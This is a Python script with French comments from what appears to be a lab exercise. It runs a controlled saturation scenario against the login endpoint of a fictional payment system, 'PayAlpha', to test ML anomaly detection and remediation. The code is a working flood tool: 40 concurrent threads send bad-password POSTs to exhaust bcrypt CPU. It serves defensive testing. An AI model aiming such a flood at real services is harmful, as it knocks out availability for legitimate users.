"""
Scenario 1 : saturation controlee de PayAlpha (atteinte a la disponibilite).

But : generer une charge soutenue sur l'endpoint d'authentification (verification bcrypt,
cout CPU reel) pour degrader la latence et le taux d'erreur, et declencher la detection ML.

Perimetre : notre SI fictif uniquement, via le WAF du PC Hote. Aucune autre cible.

Usage :
  export GATEWAY_URL="http://<IP_DU_PC_HOTE>:8080"
  python3 attack/scenarios/load_flood.py [duree_s] [concurrence]
"""
import os
import sys
import time
import json
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor

GATEWAY = os.getenv("GATEWAY_URL", "http://localhost:8080")
DURATION = int(sys.argv[1]) if len(sys.argv) > 1 else 45
CONCURRENCY = int(sys.argv[2]) if len(sys.argv) > 2 else 40

PAYLOAD = json.dumps({"username": "alice", "password": "mauvais_mot_de_passe"}).encode()


def one_request():
    req = urllib.request.Request(f"{GATEWAY}/login", data=PAYLOAD,
                                 headers={"Content-Type": "application/json"}, method="POST")
    t0 = time.perf_counter()
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, time.perf_counter() - t0
    except urllib.error.HTTPError as e:
        return e.code, time.perf_counter() - t0
    except Exception:  # noqa: BLE001
        return 0, time.perf_counter() - t0


def worker(stop_at, counters):
    while time.time() < stop_at:
        status, dt = one_request()
        counters["n"] += 1
        counters["lat"] += dt
        if status == 0:
            counters["timeout"] += 1
        elif status >= 500:
            counters["err5xx"] += 1


def main():
    print(f"[SCOPE] cible = {GATEWAY} (notre SI fictif). Duree {DURATION}s, concurrence {CONCURRENCY}.")
    print("Saturation controlee en cours...")
    counters = {"n": 0, "lat": 0.0, "err5xx": 0, "timeout": 0}
    stop_at = time.time() + DURATION
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
        for _ in range(CONCURRENCY):
            ex.submit(worker, stop_at, counters)
    n = max(1, counters["n"])
    print(f"Termine : {counters['n']} requetes, "
          f"latence moyenne {counters['lat']/n*1000:.0f} ms, "
          f"5xx {counters['err5xx']}, timeouts {counters['timeout']}.")
    print("Observez le dashboard : le score d'anomalie doit basculer, puis la remediation agir.")


if __name__ == "__main__":
    main()
